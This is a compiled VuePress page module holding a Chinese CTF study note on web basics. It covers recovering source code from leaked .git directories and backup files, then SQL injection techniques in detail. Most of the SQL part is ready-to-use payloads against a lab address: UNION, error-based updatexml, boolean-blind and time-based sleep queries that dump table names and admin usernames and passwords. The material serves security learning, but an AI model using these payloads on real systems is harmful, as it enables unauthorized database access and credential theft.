import{_ as d,M as c,p as o,q as i,R as p,t as e,N as s,a1 as t}from"./framework-6f85e614.js";const r="/assets/sql-union-fd5d5b76.png",n="/assets/select-syntax-6cc0de65.png",l={},h=t('<h1 id="第1章-web入门" tabindex="-1"><a class="header-anchor" href="#第1章-web入门" aria-hidden="true">#</a> 第1章 Web入门</h1><h2 id="_1-1-信息搜集" tabindex="-1"><a class="header-anchor" href="#_1-1-信息搜集" aria-hidden="true">#</a> 1.1 信息搜集</h2><h3 id="_1-1-1-git目录泄露" tabindex="-1"><a class="header-anchor" href="#_1-1-1-git目录泄露" aria-hidden="true">#</a> 1.1.1 git目录泄露</h3>',3),_={href:"https://github.com/denny0223/scrabble",target:"_blank",rel:"noopener noreferrer"},m=t('<p>用法：./scrabble http://example.com</p><p>（1）回溯</p><p>有时候flag可能不在当前的版本，则需要回溯</p><ol><li>先用<code>git log-stat</code>查看每个commit修改了哪个文件</li><li>再用<code>git diff HEAD commit-id</code>比较当前版本和想查看的commit之间的变化</li></ol><p>（2）分支</p><p>这部分较难，需要手动恢复分支</p><ol><li>使用<code>git reflog</code>可以查看一些checkout的记录，这里假设有个secret分支未被下载</li><li>手动下载<code>wget http://127.0.0.1:8000/.git/refs/heads/secret</code>到<code>.git/refs/heads/secret</code>中</li><li>修改GitHacker.py的源码，注释掉main()，然后复用fixmissing函数</li></ol><h3 id="_1-1-2-敏感备份文件泄露" tabindex="-1"><a class="header-anchor" href="#_1-1-2-敏感备份文件泄露" aria-hidden="true">#</a> 1.1.2 敏感备份文件泄露</h3><p>（1）gpedit</p><p>这个编辑器修改保存后会在当前目录下生成一个后缀为“~”的文件，直接访问即可</p><p>（2）vim</p><p>因意外退出时会在当前目录下生成一个备份文件，格式为.文件名.swp</p><p>恢复方式为先按文件名新建一个空白文件，然后使用<code>vim -r 文件名</code>恢复</p><p>（3）常规文件</p><ul><li>robots.txt</li><li>readme.md</li><li>www.domain.zip/rar/tar.gz —— 网站源码备份</li></ul><h2 id="_1-2-sql注入" tabindex="-1"><a class="header-anchor" href="#_1-2-sql注入" aria-hidden="true">#</a> 1.2 SQL注入</h2><h3 id="_1-2-1-数字型注入和union注入" tabindex="-1"><a class="header-anchor" href="#_1-2-1-数字型注入和union注入" aria-hidden="true">#</a> 1.2.1 数字型注入和UNION注入</h3><p>网站通常通过将SQL语句和GET方法的http查询参数进行字符串拼接，例如通过?id=1查询id为1的文章。因此可以将我们编写的SQL语句拼接，进而造成数据库泄露。</p><p>通过将id改为-1或者一个非常大的数，将当前查询的文章表的结果全都清除掉，然后用UNION关键字（联合查询）拼接查询用户表中的管理员账号和密码。</p><p>可以通过<code>LIMIT 1,1</code>限制查询的结果，即跳过前面1条，然后读取1条。</p><p><code>group_concat()</code>可以将多行记录合并显示在一个字段的一条记录里</p><p>获取表名的方式：<code>http://192.168.20.133/sql1.php？id=-1 union select 1，group_concat（table_name）from information_schema.tables where table_schema=database()</code></p><p>获取字段名的方式：<code>http://192.168.20.133/sql1.php？id=-1 union select 1，group_concat（column_name）from information_schema.columns where table_name=&#39;wp_user&#39;</code></p><p>下面是访问<code>http://192.168.20.133/sql1.php？id=-1 union select user，pwd from wp_user</code>的结果</p><div class="custom-container tip"><p class="custom-container-title">TIP</p><p>数字型注入的关键在于找到输入的参数点，然后通过加、减、乘除等运算，判断出输入参数附近没有引号包裹，再通过一些通用的攻击手段，获取数据库的敏感信息。</p></div><p><img src="'+r+'" alt="SQL联合注入"></p><h3 id="_1-2-2-字符型注入与布尔盲注" tabindex="-1"><a class="header-anchor" href="#_1-2-2-字符型注入与布尔盲注" aria-hidden="true">#</a> 1.2.2 字符型注入与布尔盲注</h3><p>将$_GET[&#39;id&#39;]用单引号或者双引号包裹起来，就成了字符型注入。这时3-2=1的运算不能成功。输入1aaa，将出现id=1的结果。这是因为id为int型，类型不同发生了强制转换。</p><p>自行闭合前后的引号，或者闭合前面的引号后面的引号用%23（＃）注释掉即可实现注入。</p><p>例如：<code>http://192.168.20.133/sql2.php？id=2%27 and 1%23</code></p><p>在前面<code>id=&#39;1&#39; and &#39;1&#39;</code>时能够正常回显页面，这是因为1自动转换为了true。可以利用and后面的语句是否为true以及页面能否正常回显来判读数据是否正确。</p><p>实际操作中需要结合<code>substring()</code>、<code>mid()</code>、<code>substr()</code>来使用。</p><p>例如判断用户名和密码的拼接字符串的第一个字符是否为a：<code>http://192.168.20.133/sql2.php？id=1&#39;and（select mid（（select concat（user，0x7e，pwd）from wp_user），1，1））=&#39;a&#39;%23</code></p><p>除此之外利用利用执行时间判断是否为SQL攻击的结果称为时间盲注</p><h3 id="_1-2-3-报错注入" tabindex="-1"><a class="header-anchor" href="#_1-2-3-报错注入" aria-hidden="true">#</a> 1.2.3 报错注入</h3><p>有时候网站会显示SQL查询的报错信息。</p><p>可以利用<code>updatexml()</code>语句来回显，第一个参数填1，第二个参数正确为xpath路径如果不是合法的路径则会回显，第三个参数填1。</p><p>例子：<code>http://192.168.20.133/sql3.php？id=1&#39;or updatexml（1，concat（0x7e，（select pwd from wp_user）），1）%23</code></p><h3 id="_1-2-4-select语句注入点" tabindex="-1"><a class="header-anchor" href="#_1-2-4-select语句注入点" aria-hidden="true">#</a> 1.2.4 SELECT语句注入点</h3><p>SELECT语法如下：</p><p><img src="'+n+'" alt="select-syntax"></p><p>（1）注入点在select_expr</p><p>可以利用时间盲注判断并获取，也可以使用AS别名的方式直接回显。</p><p>例子</p><p>SQL：<code>&quot;SELECT ${_GET[&#39;id&#39;],content} FROM wp_news&quot;</code></p><p>查询参数：<code>?id=(select pwd from wp_user) as title</code></p><p>（2）注入点在table_references</p><p>依然可以使用AS别名的方式</p><p>例子</p><p>SQL: <code>&quot;SELECT title,content FROM ${_GET[&#39;table_name&#39;]}&quot;</code></p><p>查询参数：<code>?table_name=(select pwd as title from wp_user)</code></p><p>（3）注入点在WHERE或HAVING后</p><p>例子</p><p>SQL: &quot;SELECT title FROM wp_news WHERE id=${_GET[&#39;id&#39;]}&quot;</p><p>根据情况判断是否有单引号、双引号、括号，再用<code>UNICON SELECT</code>查询</p><p>查询参数：<code>?id=-1 union select user，pwd from wp_user</code></p><p>（4）注入点在GROUP BY或ORDER BY后</p><p>在本地MySQL中进行尝试，看之后能加什么</p><p>例子</p><p>SQL：<code>&quot;SELECT title FROM wp_news GROUP BY ${_GET[&#39;title&#39;]}&quot;</code></p><p>查询参数：<code>title=id desc, (if(1，sleep (1)，1))</code></p><p>（5）注入点在LIMIT之后</p><p>整个SQL没有ORDER BY的情况下，可以直接使用UNION注入</p><p>如果MySQL&lt;5.6，那么可以尝试通过PROCEDURE尝试注入</p><h3 id="_1-2-5-sql注入总结" tabindex="-1"><a class="header-anchor" href="#_1-2-5-sql注入总结" aria-hidden="true">#</a> 1.2.5 SQL注入总结</h3><p>注入技巧的使用优先级是：UNION注入&gt;报错注入&gt;布尔盲注&gt;时间盲注</p><p>UNION注入：</p><p>注意需要匹配的列数</p><p>爆出当前数据库中所有的表：</p><p><code>id=999&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p><p>爆出某个表的所有字段：</p><p><code>id=999&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;wp_user&#39;</code></p><p>报错注入：</p><p>某些情况下会回显报错信息</p><p><code>id=999&#39; or updatexml(1,concat(0x7e,(select 1)),1)</code></p><p>布尔盲注：</p><p>某些情况下页面不直接回显查询结果，但是可以根据页面显示与否判断是否存在注入</p><p>这条语句有回显，因为1即真：</p><p><code>id=1&#39; and 1</code></p><p>这条语句没有回显，说明后面的条件为假</p><p><code>id=1&#39; and (select ascii((select mid((select database()),1,1))))&lt;112</code></p><p>一般用ascii配合二分法</p><p>时间盲注：</p><p>某些情况下注入成功与否页面显示效果都一样，这时可以通过延长查询时间来判断是否注入成功</p><p><code>id=99999&#39; or if(ascii(mid(database(),1,1))=115,sleep(1),0)#</code></p><p>一些函数的参数：</p><p>updatexml(1,path,1)</p><p>mid(str,1,1)：从第一个字符开始截取1个</p><p>ascii(str)：返回str第一个字符的ascii码</p><p>if(condition,true_result,false_result)</p>',90);function u(f,b){const a=c("ExternalLinkIcon");return o(),i("div",null,[h,p("p",null,[e("网站的git目录不小心上传了导致源码泄露，需要借助"),p("a",_,[e("scrabble"),s(a)]),e("工具抓取")]),m])}const g=d(l,[["render",u],["__file","1-Web.html.vue"]]);export{g as default};
